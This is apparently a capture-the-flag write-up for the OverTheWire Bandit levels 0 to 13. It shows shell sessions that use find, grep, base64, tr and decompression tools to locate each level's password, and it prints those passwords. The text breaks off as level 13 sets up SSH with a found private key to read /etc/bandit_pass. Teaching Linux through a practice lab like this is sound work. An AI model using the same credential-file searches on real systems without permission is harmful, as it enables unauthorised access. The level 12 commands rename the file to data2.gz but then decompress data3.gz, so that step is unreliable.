<h3>Level 0</h3>

<p>The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.</p>

<h3>Level 0 &ndash;> Level 1</h3>

<p>The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH to log into that level and continue the game.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh bandit0@bandit.labs.overthewire.org
</span><span class='line'>Welcome to the OverTheWire games machine !
</span><span class='line'>
</span><span class='line'>Please read /README.txt for more information on how to play the levels
</span><span class='line'>on this gameserver.
</span><span class='line'>
</span><span class='line'>bandit0@melinda:~$ ls
</span><span class='line'>readme
</span><span class='line'>bandit0@melinda:~$ cat readme
</span><span class='line'>boJ9jbbUNNfktd78OOpsqOltutMc3MY1</span></code></pre></td></tr></table></div></figure>


<p>Well, this is straightforward. The required file just lies around for the reading</p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>cat &ndash; concatenate files and print on the standard output</p></blockquote>

<h3>Level 1 &ndash;> Level 2</h3>

<p>The password for the next level is stored in a file called &ndash; located in the home directory</p>

<p>Although filenames starting with dashes are legal in Linux, if you try to use some commands on them, the dash would get confused with command flags. If you try to <em>cat</em> it directly, <em>cat</em> will just wait for further input. The workaround is to feed <em>cat</em> the path to the file (can also be done just by using the current directory path)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit1@melinda:~$ ls
</span><span class='line'>-
</span><span class='line'>bandit1@melinda:~$ pwd
</span><span class='line'>/home/bandit1
</span><span class='line'>bandit1@melinda:~$ cat /home/bandit1/-
</span><span class='line'>CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</span></code></pre></td></tr></table></div></figure>


<h3>Level 2 &ndash;> Level 3</h3>

<p>The password for the next level is stored in a file called spaces in this filename located in the home directory</p>

<p>Spaces in filenames can be interpreted wrongly on the command line, because they may look as separators for the commands instead of literal spaces that are part of a filename, and this leads to all sorts of problems. That is why using spaces in filenames are generally avoided in Linux. If you try to <em>cat</em> the file as it is, this is what happens:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit2@melinda:~$ ls 
</span><span class='line'>spaces in this filename
</span><span class='line'>bandit2@melinda:~$ cat spaces in this filename
</span><span class='line'>cat: spaces: No such file or directory
</span><span class='line'>cat: in: No such file or directory
</span><span class='line'>cat: this: No such file or directory
</span><span class='line'>cat: filename: No such file or directory</span></code></pre></td></tr></table></div></figure>


<p>To solve the issue, you can either wrap the filenames in quotes or escape the spaces with backslashes, to ensure that the name of the file is passed correctly to the command (and if you use Tab completion, the shell will automatically escape them for you :D)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit2@melinda:~$ cat 'spaces in this filename'
</span><span class='line'>UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
</span><span class='line'>bandit2@melinda:~$ cat spaces\ in\ this\ filename 
</span><span class='line'>UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span></code></pre></td></tr></table></div></figure>


<h3>Level 3 &ndash;> Level 4</h3>

<p>The password for the next level is stored in a hidden file in the inhere directory.</p>

<p>If you do a normal <em>ls</em>, you won&rsquo;t see anything. To see hidden files, you use the <em>-a</em> option, which stands for <em>&mdash;all</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit3@melinda:~$ ls
</span><span class='line'>inhere
</span><span class='line'>bandit3@melinda:~$ cd inhere
</span><span class='line'>bandit3@melinda:~/inhere$ ls -a
</span><span class='line'>.  ..  .hidden
</span><span class='line'>bandit3@melinda:~/inhere$ cat .hidden
</span><span class='line'>pIwrPrtPN36QITSp3EQaw936yaFoFgAB</span></code></pre></td></tr></table></div></figure>


<p><strong>Useful command(s)</strong></p>

<blockquote><p>ls &ndash; list directory contents</p>

<p>-a, &mdash;all
do not ignore entries starting with .</p></blockquote>

<h3>Level 4 &ndash; Level 5</h3>

<p>The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit4@melinda:~/inhere$ ls
</span><span class='line'>-file00  -file02  -file04  -file06  -file08
</span><span class='line'>-file01  -file03  -file05  -file07  -file09
</span><span class='line'>bandit4@melinda:~/inhere$ cat ./-file00
</span><span class='line'>;�-i�(��z��У��ޘ�鑾</span></code></pre></td></tr></table></div></figure>


<p>You can try to manually <em>cat</em> each of them, until you will reach the right one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit4@melinda:~/inhere$ cat ./-file07
</span><span class='line'>koReBOKuIDDepwhWk7jZC0RTdopnAYKh</span></code></pre></td></tr></table></div></figure>


<p>But what if there were hundreds of files? If you use the <em>file</em> command, you can see the difference between the files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./-file00: data
</span><span class='line'>./-file01: data
</span><span class='line'>./-file02: data
</span><span class='line'>./-file03: data
</span><span class='line'>./-file04: data
</span><span class='line'>./-file05: data
</span><span class='line'>./-file06: data
</span><span class='line'>./-file07: ASCII text
</span><span class='line'>./-file08: data
</span><span class='line'>./-file09: data</span></code></pre></td></tr></table></div></figure>


<p>Now you know which file to look in for the password!</p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>file — determine file type</p></blockquote>

<h3>Level 5 &ndash;> Level 6</h3>

<p>The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties: &ndash; human-readable &ndash; 1033 bytes in size &ndash; not executable</p>

<p>Well, clearly no manual work here, the directory is filled with other folders:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit5@melinda:~/inhere$ ls
</span><span class='line'>maybehere00  maybehere04  maybehere08  maybehere12  maybehere16
</span><span class='line'>maybehere01  maybehere05  maybehere09  maybehere13  maybehere17
</span><span class='line'>maybehere02  maybehere06  maybehere10  maybehere14  maybehere18
</span><span class='line'>maybehere03  maybehere07  maybehere11  maybehere15  maybehere19</span></code></pre></td></tr></table></div></figure>


<p>To find the file with the required properties, we can use..<em>find</em>! It conveniently has the exact switches for what we&rsquo;re looking for:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit5@melinda:~/inhere$ find ! -executable -readable -size 1033c
</span><span class='line'>./maybehere07/.file2
</span><span class='line'>bandit5@melinda:~/inhere/maybehere07$ cat .file2
</span><span class='line'>DXjZPULLxYr17uwoI01bNLQbtFemEgo7</span></code></pre></td></tr></table></div></figure>


<p><strong>Useful command(s)</strong></p>

<blockquote><p>find &ndash; search for files in a directory hierarchy</p>

<p>-executable
Matches files which are executable  and  directories  which  are searchable  (in  a file name resolution sense).</p>

<p>-readable
Matches  files  which  are  readable.</p>

<p>-size n
File uses n units of space.
`c&#8217;    for bytes</p></blockquote>

<h3>Level 6 &ndash;> Level 7</h3>

<p>The password for the next level is stored somewhere on the server and has all of the following properties: &ndash; owned by user bandit7 &ndash; owned by group bandit6 &ndash; 33 bytes in size</p>

<p>Again, <em>find</em> comes to the rescue!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit6@melinda:~$ find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null
</span><span class='line'>/var/lib/dpkg/info/bandit7.password
</span><span class='line'>bandit6@melinda:~$ cat /var/lib/dpkg/info/bandit7.password
</span><span class='line'>HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</span></code></pre></td></tr></table></div></figure>


<p><strong>Useful command(s)</strong></p>

<blockquote><p>find</p>

<p>-user uname</p>

<p>File is owned by user uname (numeric user ID allowed).</p>

<p>-group gname</p>

<p>File belongs to group gname (numeric group ID allowed).</p></blockquote>

<h3>Level 7 &ndash;> Level 8</h3>

<p>The password for the next level is stored in the file data.txt next to the word millionth</p>

<p>We can use <em>grep</em> to get the line with the millionth word and our password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit7@melinda:~$ cat data.txt | grep millionth
</span><span class='line'>millionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV</span></code></pre></td></tr></table></div></figure>


<p><strong>Useful command(s)</strong></p>

<blockquote><p>grep  searches the named input FILEs (or standard input if no files are
named, or if a single hyphen-minus (&ndash;) is given as file name) for lines
containing  a  match to the given PATTERN.  By default, grep prints the
matching lines.</p></blockquote>

<h3>Level 8 &ndash;> Level 9</h3>

<p>The password for the next level is stored in the file data.txt and is the only line of text that occurs only once</p>

<p>To get only the unique line(s), we will use some more pipe redirection:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit8@melinda:~$ sort data.txt | uniq -u
</span><span class='line'>UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</span></code></pre></td></tr></table></div></figure>


<p><strong>Useful command(s)</strong></p>

<blockquote><p>sort &ndash; sort lines of text files</p>

<p>uniq &ndash; report or omit repeated lines
-u, &mdash;unique
only print unique lines</p></blockquote>

<h3>Level 9 &ndash;> Level 10</h3>

<p>The password for the next level is stored in the file data.txt in one of the few human-readable strings, beginning with several ‘=’ characters.</p>

<p>For this one we can use <em>strings</em> and <em>grep</em> for the = sign:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit9@melinda:~$ strings data.txt | grep =
</span><span class='line'>epr~F=K
</span><span class='line'>7?YD=
</span><span class='line'>?M=HqAH
</span><span class='line'>/(Ne=
</span><span class='line'>C=_"
</span><span class='line'>I========== the6
</span><span class='line'>z5Y=
</span><span class='line'>`h(8=`
</span><span class='line'>n\H=;
</span><span class='line'>========== password
</span><span class='line'>========== ism
</span><span class='line'>N$=&
</span><span class='line'>l/a=L)
</span><span class='line'>f=C(
</span><span class='line'>========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
</span><span class='line'>ie)=5e</span></code></pre></td></tr></table></div></figure>


<p><strong>Useful command(s)</strong></p>

<blockquote><p>strings &ndash; print the strings of printable characters in files.</p></blockquote>

<h3>Level 10 &ndash;> Level 11</h3>

<p>The password for the next level is stored in the file data.txt, which contains base64 encoded data</p>

<p>Luckily, there is a command-line utility just for that purpose!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit10@melinda:~$ base64 -d data.txt
</span><span class='line'>The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</span></code></pre></td></tr></table></div></figure>


<p><strong>Useful command(s)</strong></p>

<blockquote><p>base64 &ndash; base64 encode/decode data and print to standard output</p>

<p>-d, &mdash;decode
decode data</p></blockquote>

<h3>Level 11 &ndash;> Level 12</h3>

<p>The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions</p>

<p>If you read the ROT13 Implementation section on Wikipedia, it will actually give you a hint on how to solve this challenge and the program needed.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit11@melinda:~$ cat data.txt | tr a-zA-Z n-za-mN-ZA-M
</span><span class='line'>The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</span></code></pre></td></tr></table></div></figure>


<p>Because the content of the file has been rotated 13 characters, we use the <em>tr</em> command to shift it back to the original</p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>tr &ndash; translate or delete characters</p>

<p>CHAR1-CHAR2
all characters from CHAR1 to CHAR2 in ascending order</p></blockquote>

<h3>Level 12 &ndash;> Level 13</h3>

<p>The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)</p>

<p>If you <em>cat</em> data.txt this is what you will see:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit12@melinda:~$ cat data.txt
</span><span class='line'>0000000: 1f8b 0808 34da 6554 0203 6461 7461 322e  ....4.eT..data2.
</span><span class='line'>0000010: 6269 6e00 013f 02c0 fd42 5a68 3931 4159  bin..?...BZh91AY
</span><span class='line'>0000020: 2653 5982 c194 8a00 0019 ffff dbfb adfb  &SY.............
</span><span class='line'>0000030: bbab b7d7 ffea ffcd fff7 bfbf 1feb eff9  ................
</span><span class='line'>0000040: faab 9fbf fef2 fefb bebf ffff b001 3b18  ..............;.
</span><span class='line'>0000050: 6400 001e a000 1a00 6468 0d01 a064 d000  d.......dh...d..
</span><span class='line'>0000060: 0d00 0034 00c9 a320 001a 0000 0d06 80d1  ...4... ........
</span><span class='line'>0000070: a340 01b4 98d2 3d13 ca20 6803 40d1 a340  .@....=.. h.@..@
</span><span class='line'>0000080: 1a00 0340 0d0d 0000 000d 0c80 6803 4d01  ...@........h.M.
</span><span class='line'>0000090: a3d4 d034 07a8 0683 4d0c 4034 069e 91ea  ...4....M.@4....
</span><span class='line'>00000a0: 0f50 1a1a 1ea3 40e9 ea0c 80d0 0346 87a9  .P....@......F..
</span><span class='line'>00000b0: a006 8193 4340 d320 c403 2064 00c4 000c  ....C@. .. d....
</span><span class='line'>00000c0: 8640 0d00 0d06 8340 0c9a 0068 0000 6468  .@.....@...h..dh
</span><span class='line'>00000d0: 1854 0084 0008 38c4 7c28 66b3 bf1f 366d  .T....8.|(f...6m
</span><span class='line'>00000e0: 3971 1c93 f09a 6287 0cfe 04d3 efa9 4164  9q....b.......Ad
</span><span class='line'>00000f0: 0ad1 1828 6c55 75ff 6922 dedd 8cfe 5936  ...(lUu.i"....Y6
</span><span class='line'>0000100: e351 7ae8 0590 6c01 0446 5f2a ba7e 8503  .Qz...l..F_*.~..
</span><span class='line'>0000110: a710 a38c d8c1 9781 5249 b909 8d92 5e09  ........RI....^.
</span><span class='line'>0000120: b343 32a1 9890 cc63 74f2 a3a1 f260 3afa  .C2....ct....`:.
</span><span class='line'>0000130: 4f55 cc30 f7a3 5c20 d610 a588 1ab4 543c  OU.0..\ ......T&lt;
</span><span class='line'>0000140: 71b3 d052 8980 010a b270 4112 89c4 ad7a  q..R.....pA....z
</span><span class='line'>0000150: 8386 125d a460 3a11 3da3 4949 a01f 9e7d  ...].`:.=.II...}
</span><span class='line'>0000160: 8f5e fef5 e13a 4537 dfb3 a898 92e8 cca0  .^...:E7........
</span><span class='line'>0000170: 155c fb29 d0e1 08cf 0cec 7006 b1bc 8f39  .\.)......p....9
</span><span class='line'>0000180: 51bc 1b7b e1ef 161f f020 6830 b1fd d69c  Q..{..... h0....
</span><span class='line'>0000190: e096 54a1 1a03 47ce c4f1 00c7 e520 2e02  ..T...G...... ..
</span><span class='line'>00001a0: 5577 63ac 3dc9 0f84 200a 745d 0503 f8f4  Uwc.=... .t]....
</span><span class='line'>00001b0: b9fb 1152 1c22 a410 572e 11ac cf9e 5ff6  ...R."..W....._.
</span><span class='line'>00001c0: dbf4 ef68 3010 7e36 026e aa38 19fd 4c37  ...h0.~6.n.8..L7
</span><span class='line'>00001d0: 392c a262 f646 8710 9231 4ee4 5200 c601  9,.b.F...1N.R...
</span><span class='line'>00001e0: 529a fec3 8c89 f85d 5f12 5c2f 9073 4544  R......]_.\/.sED
</span><span class='line'>00001f0: 4fed fb97 a851 f831 cd9a 69d7 e80b 12b5  O....Q.1..i.....
</span><span class='line'>0000200: fb37 ba20 86e9 92a7 78c5 5092 2bac 6269  .7. ....x.P.+.bi
</span><span class='line'>0000210: 01c7 09a1 fda4 ef8b 7c14 1832 a30f db92  ........|..2....
</span><span class='line'>0000220: d345 a9b4 de57 8996 4dc7 8ee8 b334 02b2  .E...W..M....4..
</span><span class='line'>0000230: 8dc4 a6a6 08ea c285 d28c 9f60 6779 540a  ...........`gyT.
</span><span class='line'>0000240: 2b97 5e3f f82c 1800 80f1 32b0 32d1 7724  +.^?.,....2.2.w$
</span><span class='line'>0000250: 5385 0908 2c19 48a0 d123 d96f 3f02 0000  S...,.H..#.o?...</span></code></pre></td></tr></table></div></figure>


<p>So, if it&rsquo;s been repeatedly compressed, than repeatedly decompressing it should do the job (this actually took an annoying time of repetitions&hellip;am I repeating the repeat word too often? :D)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit12@melinda:~$ mkdir /tmp/mystuff
</span><span class='line'>bandit12@melinda:~$ cp data.txt /tmp/mystuff
</span><span class='line'>bandit12@melinda:~$ cd /tmp/mystuff</span></code></pre></td></tr></table></div></figure>


<p>To reverse the hexdump we will use <em>xxd</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit12@melinda:/tmp/mystuff$ xxd -r data.txt &gt; newdata</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s look at it (not literally, it&rsquo;s full of garbage):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit12@melinda:/tmp/mystuff$ file newdata
</span><span class='line'>newdata: gzip compressed data, was "data2.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression</span></code></pre></td></tr></table></div></figure>


<p>So now we know the data file was previously a binary file and it&rsquo;s been compressed with <em>gzip</em>. This means we know how to decompress it. There are a couple ways to do it. If you want to use <em>gzip</em>, you have to rename the file with a <em>.gz</em> extension:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit12@melinda:/tmp/mystuff$ mv newdata data2.gz
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ gzip -d data3.gz
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ file data3
</span><span class='line'>data3: bzip2 compressed data, block size = 900k</span></code></pre></td></tr></table></div></figure>


<p>You can also use <em>zcat</em> directly on the file without adding any extension:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit12@melinda:/tmp/mystuff$ zcat newdata &gt; data3
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ file data3
</span><span class='line'>data3: bzip2 compressed data, block size = 900k</span></code></pre></td></tr></table></div></figure>


<p>Since we know the program used to compress it, we use the same for the reverse:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit12@melinda:/tmp/mystuff$ bzip2 -d data3
</span><span class='line'>bzip2: Can't guess original name for data3 -- using data3.out
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ file data3.out 
</span><span class='line'>data3.out: gzip compressed data, was "data4.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ve been through this kind of decompression before:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit12@melinda:/tmp/mystuff$ zcat data3.out &gt; data5
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ file data5
</span><span class='line'>data5: POSIX tar archive (GNU)</span></code></pre></td></tr></table></div></figure>


<p>Next we have a tar archive and we will just loop decompressions until we&rsquo;re done:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit12@melinda:/tmp/mystuff$ tar xvf data5
</span><span class='line'>data5.bin
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ file data5.bin
</span><span class='line'>data5.bin: POSIX tar archive (GNU)
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ tar xvf data5.bin
</span><span class='line'>data6.bin
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ file data6.bin
</span><span class='line'>data6.bin: bzip2 compressed data, block size = 900k
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ bzip2 -d data6.bin
</span><span class='line'>bzip2: Can't guess original name for data6.bin -- using data6.bin.out
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ file data6.bin.out
</span><span class='line'>data6.bin.out: POSIX tar archive (GNU)
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ tar xvf data6.bin.out
</span><span class='line'>data8.bin
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ file data8.bin
</span><span class='line'>data8.bin: gzip compressed data, was "data9.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ zcat data8.bin &gt; data9
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ file data9
</span><span class='line'>data9: ASCII text
</span><span class='line'>bandit12@melinda:/tmp/mystuff$ cat data9
</span><span class='line'>The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</span></code></pre></td></tr></table></div></figure>


<p>Finally! Had enough decompressions for one day.</p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>xxd &ndash; make a hexdump or do the reverse.</p>

<p>-r | -revert</p>

<p>reverse operation: convert (or patch) hexdump into binary. If not writing to stdout, xxd writes into its output file without truncating it.</p>

<p>mv &ndash; move (rename) files</p>

<p>gzip &ndash; compress or expand files. Whenever possible, each file is replaced by one with the extension .gz. By default, gzip keeps the original file
name and timestamp in the compressed  file. Compressed files can be restored to their original form using gzip -d  or gunzip or zcat.</p>

<p>-d &mdash;decompress &mdash;uncompress
Decompress.</p>

<p>zcat uncompresses either a list of files on the command line or its standard input and writes the uncompressed data on standard output. zcat will
uncompress files that have the correct magic number whether they have a .gz suffix or not.</p>

<p>bzip2 &ndash; a block-sorting file compressor</p>

<p>bzip2 expects a list of file names to accompany the command-line flags. Each  file is replaced by a compressed version of itself, with the name
&ldquo;original_name.bz2&rdquo;.</p>

<p>If  the  file does not end in one of the recognised endings, .bz2, .bz, .tbz2 or .tbz, bzip2 complains that it cannot guess the name  of the
original file, and uses the original name with .out appended.</p>

<p>-d &mdash;decompress
Force  decompression.</p>

<p>Tar stores and extracts files from a tape or disk archive.</p>

<p>-x, &mdash;extract, &mdash;get
extract files from an archive</p>

<p>-v, &mdash;verbose
verbosely list files processed</p>

<p>-f, &mdash;file ARCHIVE
use archive file or device ARCHIVE</p></blockquote>

<h3>Level 13 &ndash;> Level 14</h3>

<p>The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on</p>

<p>Ok, we have a private key:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit13@melinda:~$ ls
</span><span class='line'>sshkey.private
</span><span class='line'>bandit13@melinda:~$ file sshkey.private
</span><span class='line'>sshkey.private: PEM RSA private key</span></code></pre></td></tr></table></div></figure>


<p>The description hinted that we need to use the private key to SSH as bandit14 and read the password, and also mentioned localhost. So let&rsquo;s ssh to localhost:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
